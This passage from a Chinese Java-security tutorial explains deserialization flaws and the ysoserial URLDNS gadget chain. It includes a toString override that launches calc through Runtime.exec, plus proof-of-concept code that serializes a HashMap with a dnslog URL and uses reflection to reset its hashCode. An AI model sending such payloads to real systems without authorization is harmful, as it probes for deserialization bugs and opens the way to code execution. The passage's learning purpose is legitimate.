id="2-入口类参数中包含可控类，该类有危险方法，readObject-时调用"><a href="#2-入口类参数中包含可控类，该类有危险方法，readObject-时调用" class="headerlink" title="2.入口类参数中包含可控类，该类有危险方法，readObject 时调用"></a>2.入口类参数中包含可控类，该类有危险方法，readObject 时调用</h4><p>toSting 方法：当使用 System.out.println() 打印对象时，实际上会调用该对象的 toString 方法来获取字符串表示形式</p><p>在Person类中重写 <em>toString</em> 方法，调用计算器</p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240424135426887.png" alt="image-20240424135426887"></p><p>进行序列化操作，生成ser.bin文件，对ser.bin文件反序列化时会调用重写的 toString 方法，从而执行计算器</p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240424135758323.png" alt="image-20240424135758323"></p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sqf">原理：<br><span class="hljs-number">1</span>、obj是通过反序列化得到的，其类型是Person，而Person类中重写了<span class="hljs-built_in">toString</span>方法，所以在打印时会调用Person类的<span class="hljs-built_in">toString</span>方法。<br><span class="hljs-number">2</span>、由于<span class="hljs-built_in">toString</span>方法包含了执行Runtime.getRuntime().<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;calc&quot;</span>)的代码，导致计算器弹出。<br></code></pre></td></tr></table></figure><p>但这本身其实是由于打印对象时造成的安全问题，和反序列化并没有太大关系，</p><p>只是想说如果对方在反序列化的时候同时打印了对象，那么这里也可以成为一个利用点。</p><h4 id="3-入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject时调用"><a href="#3-入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject时调用" class="headerlink" title="3.入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject时调用"></a>3.入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject时调用</h4><p>这里使用 URLDNS反序列化链 进行分析</p><p><code>URLDNS</code> 是ysoserial中利用链的一个名字，通常用于检测是否存在Java反序列化漏洞。该利用链具有如下特点：</p><ul><li>不限制jdk版本，使用Java内置类，对第三方依赖没有要求</li><li>目标无回显，可以通过DNS请求来验证是否存在反序列化漏洞</li><li>URLDNS利用链，只能发起DNS请求，并不能进行其他利用</li></ul><h6 id="URLDNS反序列化链复现："><a href="#URLDNS反序列化链复现：" class="headerlink" title="URLDNS反序列化链复现："></a>URLDNS反序列化链复现：</h6><p>利用 ysoserial-0.0.6-SNAPSHOT-all.jar 工具生成一个序列化数据</p><p>链接：<a href="https://github.com/Y4er/ysoserial">https://github.com/Y4er/ysoserial</a></p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240424144200349.png" alt="image-20240424144200349"></p><p>创建一个 <em>UnseriaTest</em> 类，对 urldns.txt 文件进行反序列化操作，urldns.txt需要放到项目目录下</p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240424144448230.png" alt="image-20240424144448230"></p><p>dnslog成功收到请求</p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240424144601351.png" alt="image-20240424144601351"></p><h6 id="URLDNS反序列化链分析："><a href="#URLDNS反序列化链分析：" class="headerlink" title="URLDNS反序列化链分析："></a>URLDNS反序列化链分析：</h6><p>根据 ysoserial 中列出的 Gadget 进行分析：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">*   Gadget Chain:<span class="hljs-operator"></span><br><span class="hljs-operator">*     </span><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>read<span class="hljs-constructor">Object()</span><span class="hljs-operator"></span><br><span class="hljs-operator">*       </span><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>put<span class="hljs-constructor">Val()</span><span class="hljs-operator"></span><br><span class="hljs-operator">*         </span><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>hash<span class="hljs-literal">()</span><span class="hljs-operator"></span><br><span class="hljs-operator">*           </span><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">URL</span>.</span></span>hash<span class="hljs-constructor">Code()</span><br></code></pre></td></tr></table></figure><p>具体流程就是：<code>java.util.HashMap</code> 重写了 <code>readObject</code>, 在反序列化时会调用 <code>hash</code> 函数计算 key 的 hashCode，而传入 <code>java.net.URL</code> 类的时候会调用 URL.hashCode() ，URL.hashCode() 在计算时会调用 <code>getHostAddress</code> 来解析域名, 从而发出 DNS 请求</p><p><strong>HashMap#readObject：</strong></p><p>代码中敲一个 <em>HashMap</em>  (HashMap 是 Java 中一种常用的数据结构，用于存储键值对，它基于哈希表实现，可以高效地存储和检索数据)，然后ctrl+鼠标点过去，搜索一下重写的 readObject 方法</p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240424151032287.png" alt="image-20240424151032287"></p><p>代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span> <span class="hljs-comment">// 读取传入的输入流，对传入的序列化数据进行反序列化</span><br>        <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-comment">// 读取阈值(忽略)、加载因子和任何隐藏内容</span><br>        s.defaultReadObject(); <span class="hljs-comment">//使用 s.defaultReadObject() 读取并忽略阈值（threshold）、负载因子（loadfactor）和任何隐藏信息。</span><br>        reinitialize(); <span class="hljs-comment">//重新初始化 HashMap 对象</span><br>        <span class="hljs-keyword">if</span> (loadFactor &lt;= <span class="hljs-number">0</span> || Float.isNaN(loadFactor))<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidObjectException</span>(<span class="hljs-string">&quot;Illegal load factor: &quot;</span> +<br>                                             loadFactor);<br>        s.readInt();                <span class="hljs-comment">// 读取并忽略存储桶数量</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">mappings</span> <span class="hljs-operator">=</span> s.readInt(); <span class="hljs-comment">// 从输入流中读取映射数（即 HashMap 的大小）。如果映射数小于 0，则抛出 InvalidObjectException。</span><br>        <span class="hljs-keyword">if</span> (mappings &lt; <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidObjectException</span>(<span class="hljs-string">&quot;Illegal mappings count: &quot;</span> +<br>                                             mappings);<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (mappings &gt; <span class="hljs-number">0</span>) &#123; <br>            <span class="hljs-comment">// 如果映射数大于 0，则根据负载因子和映射数调整表的容量。容量范围在 DEFAULT_INITIAL_CAPACITY 到 MAXIMUM_CAPACITY 之间。</span><br>            <span class="hljs-type">float</span> <span class="hljs-variable">lf</span> <span class="hljs-operator">=</span> Math.min(Math.max(<span class="hljs-number">0.25f</span>, loadFactor), <span class="hljs-number">4.0f</span>);<br>            <span class="hljs-type">float</span> <span class="hljs-variable">fc</span> <span class="hljs-operator">=</span> (<span class="hljs-type">float</span>)mappings / lf + <span class="hljs-number">1.0f</span>;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">cap</span> <span class="hljs-operator">=</span> ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?<br>                       DEFAULT_INITIAL_CAPACITY :<br>                       (fc &gt;= MAXIMUM_CAPACITY) ?<br>                       MAXIMUM_CAPACITY :<br>                       tableSizeFor((<span class="hljs-type">int</span>)fc));<br>            <span class="hljs-type">float</span> <span class="hljs-variable">ft</span> <span class="hljs-operator">=</span> (<span class="hljs-type">float</span>)cap * lf;<br>            threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?<br>                         (<span class="hljs-type">int</span>)ft : Integer.MAX_VALUE);<br><br>            <span class="hljs-comment">// 创建一个指定容量的 Node 数组作为 HashMap 的表（table）</span><br>            SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, cap);<br>            <span class="hljs-meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span><br>            Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>[cap];<br>            table = tab;<br><br>            <span class="hljs-comment">// 从输入流中依次读取键和值，并使用 putVal 方法将映射放入 HashMap 中</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; mappings; i++) &#123;<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> (K) s.readObject();<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    <span class="hljs-type">V</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (V) s.readObject();<br>                putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>前面不懂可以不看，重点在<code>putVal</code>方法</p><p><strong>HashMap.putVal()：</strong></p><p><code>putVal</code>是往HashMap中放入键值对的方法，putVal 里调用了hash方法来处理key</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; mappings; i++) &#123;<br>    <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>        <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> (K) s.readObject();<br>    <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>        <span class="hljs-type">V</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (V) s.readObject();<br>    putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>HashMap.hash()：</strong></p><p>跟进hash方法，这里又调用了<code>key.hashcode</code>方法，根据调用链来看，传入的是 key 值是<code>URL</code> 对象，所以调用的是 <code>URL.hashCode()</code> </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hash</span><span class="hljs-params">(Object key)</span> &#123;<br>        <span class="hljs-type">int</span> h;<br>        <span class="hljs-keyword">return</span> (key == <span class="hljs-literal">null</span>) ? <span class="hljs-number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="hljs-number">16</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><p><strong>URL#hashCode：</strong></p><p>那么跟进到这个 URL 类的 hashCode() 方法看下，导入一个URL类，ctrl+鼠标点过去，搜索 hashCode() 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">if</span> (hashCode != -<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">return</span> hashCode;<br><br>        hashCode = handler.hashCode(<span class="hljs-built_in">this</span>);<br>        <span class="hljs-keyword">return</span> hashCode;<br>    &#125;<br></code></pre></td></tr></table></figure><p>判断如果 hashCode 不为<code>-1</code>，那么直接返回了，代码中 hashCode 是通过<code>private</code>关键字进行修饰的赋值为-1，所以会执行下一步进行<code>handler.hashCode(this)</code> </p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240425094458802.png" alt="image-20240425094458802"></p><p>查看 <code>handler.hashCode(this)</code>  方法的定义，重点关注这里的 getHostAddress 方法，正是这步触发了dns请求：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">(URL u)</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>        <span class="hljs-comment">// 生成协议部分</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">protocol</span> <span class="hljs-operator">=</span> u.getProtocol();<br>        <span class="hljs-keyword">if</span> (protocol != <span class="hljs-literal">null</span>)<br>            h += protocol.hashCode();<br><br>        <span class="hljs-comment">// 生成host部分</span><br>        <span class="hljs-type">InetAddress</span> <span class="hljs-variable">addr</span> <span class="hljs-operator">=</span> getHostAddress(u);<br>        <span class="hljs-keyword">if</span> (addr != <span class="hljs-literal">null</span>) &#123;<br>            h += addr.hashCode();<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">host</span> <span class="hljs-operator">=</span> u.getHost();<br>            <span class="hljs-keyword">if</span> (host != <span class="hljs-literal">null</span>)<br>                h += host.toLowerCase().hashCode();<br>        &#125;<br><br>        <span class="hljs-comment">// 生成文件部分</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> u.getFile();<br>        <span class="hljs-keyword">if</span> (file != <span class="hljs-literal">null</span>)<br>            h += file.hashCode();<br><br>        <span class="hljs-comment">// 生成端口部分</span><br>        <span class="hljs-keyword">if</span> (u.getPort() == -<span class="hljs-number">1</span>)<br>            h += getDefaultPort();<br>        <span class="hljs-keyword">else</span><br>            h += u.getPort();<br><br>        <span class="hljs-comment">// 生成ref部分</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> u.getRef();<br>        <span class="hljs-keyword">if</span> (ref != <span class="hljs-literal">null</span>)<br>            h += ref.hashCode();<br><br>        <span class="hljs-keyword">return</span> h;<br>    &#125;<br></code></pre></td></tr></table></figure><p>查看 getHostAddress 方法的定义如下，其中 InetAddress.getByName(host) 会进行dns查询：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">synchronized</span> InetAddress <span class="hljs-title function_">getHostAddress</span><span class="hljs-params">(URL u)</span> &#123;<br>        <span class="hljs-comment">// 检查URL对象的hostAddress字段是否已经存储了主机地址，如果已经存储，则直接返回该地址</span><br>    <span class="hljs-keyword">if</span> (u.hostAddress != <span class="hljs-literal">null</span>)<br>            <span class="hljs-keyword">return</span> u.hostAddress;<br><br>    <span class="hljs-comment">// 如果hostAddress字段为空，则尝试从URL对象中获取主机名。</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">host</span> <span class="hljs-operator">=</span> u.getHost();<br>        <span class="hljs-keyword">if</span> (host == <span class="hljs-literal">null</span> || host.equals(<span class="hljs-string">&quot;&quot;</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                u.hostAddress = InetAddress.getByName(host);<span class="hljs-comment">// 发送dns请求</span><br>            &#125; <span class="hljs-keyword">catch</span> (UnknownHostException ex) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>            &#125; <span class="hljs-keyword">catch</span> (SecurityException se) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> u.hostAddress;<br>    &#125;<br></code></pre></td></tr></table></figure><h6 id="Poc验证："><a href="#Poc验证：" class="headerlink" title="Poc验证："></a>Poc验证：</h6><p>以上是根据 ysoserial 中列出的 Gadget 进行的分析，接下来尝试写一个 poc 验证一下</p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240425160322758.png" alt="image-20240425160322758"></p><p>代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, IOException, IllegalAccessException, NoSuchFieldException &#123;<br>        HashMap&lt;URL, String&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;URL, String&gt;(); <span class="hljs-comment">// new一个HashMap对象，需要传入键值对格式，这里传递一个URL类和字符串</span><br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://2miwqz.dnslog.cn&quot;</span>); <span class="hljs-comment">// new一个URL类，内容是dnslog的</span><br>        hashMap.put(url,<span class="hljs-string">&quot;123&quot;</span>); <span class="hljs-comment">// 将URL和字符串put到hashMap里</span><br>        serialize(hashMap);<span class="hljs-comment">// 对hashMap进行序列化</span><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(Files.newOutputStream(Paths.get(<span class="hljs-string">&quot;urldns.bin&quot;</span>))); <span class="hljs-comment">//将序列化后的数据输出到urldns.bin文件中</span><br>        oos.writeObject(obj); <span class="hljs-comment">//调用writeObject方法，对传入的类进行序列化操作</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在这里发现问题，在进行序列化的时候就已经收到了dns的请求，这是因为给 hashMap 传值是调用了其 put 方法，put方法中调用了前面的 putVal 方法，之后调用 hashCode 方法，进行了dns请求</p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240425160427804.png" alt="image-20240425160427804"></p><p>跟一下 hashMap.put 方法，这里调用了 putVal 方法，putVal 又调用了 hash 方法，就会走到前面跟链的结果，从而请求dns：</p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240425160959796.png" alt="image-20240425160959796"></p><p>所以为了避免在序列化时就进行dns请求，这里可以使用反射的方式，先将 hashcode 的值设置为不是-1的值，这样就不会执行 <code>handler.hashCode()</code> 方法了，从而不进行dns请求</p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240425162122720.png" alt="image-20240425162122720"></p><p>关于反射的机制可以在这个链接中了解一下：<a href="https://javasec.org/javase/Reflection/Reflection.html">https://javasec.org/javase/Reflection/Reflection.html</a></p><p>通过使用反射可以获取到任何类的成员方法、成员变量、构造方法等信息，还可以修改任意的类成员变量值等，这里直接利用反射修改 hashCode 的值即可</p><p>代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, IOException, IllegalAccessException, NoSuchFieldException &#123;<br>        HashMap&lt;URL, String&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;URL, String&gt;(); <span class="hljs-comment">// new一个HashMap对象，需要传入键值对格式，这里传递一个URL类和字符串</span><br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://s91yp7.dnslog.cn&quot;</span>); <span class="hljs-comment">// new一个URL类，内容是dnslog的</span><br>        Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">URL</span>&gt; urlClass = url.getClass(); <span class="hljs-comment">// 通过反射得到url类</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">hashCode</span> <span class="hljs-operator">=</span> urlClass.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>); <span class="hljs-comment">// 获取hashCode值</span><br>        hashCode.setAccessible(<span class="hljs-literal">true</span>);<span class="hljs-comment">//由于hashCode是私有成员，所有这里需要设置允许访问对象的私有成员</span><br>        hashCode.set(url,<span class="hljs-number">123</span>); <span class="hljs-comment">//修改hashCode值为123</span><br>        hashMap.put(url,<span class="hljs-string">&quot;123&quot;</span>); <span class="hljs-comment">// 将URL和字符串put到hashMap里</span><br>        hashCode.set(url,-<span class="hljs-number">1</span>); <span class="hljs-comment">// 由于之前将hashCode值修改了，为了后续反序列化时执行dns请求，需要将其修改回-1</span><br>        serialize(hashMap);<span class="hljs-comment">// 对hashMap进行序列化</span><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(Files.newOutputStream(Paths.get(<span class="hljs-string">&quot;urldns.bin&quot;</span>))); <span class="hljs-comment">//将序列化后的数据输出到urldns.bin文件中</span><br>        oos.writeObject(obj); <span class="hljs-comment">//调用writeObject方法，对传入的类进行序列化操作</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这样进行序列化就不会发送dns请求了</p><p>之后对序列化后的文件 urldns.bin 进行反序列化</p><p>代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Unserialization</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        unserialize(<span class="hljs-string">&quot;urldns.bin&quot;</span>); <span class="hljs-comment">// 对urldns.bin进行反序列化操作</span><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, IOException &#123;<br>        <span 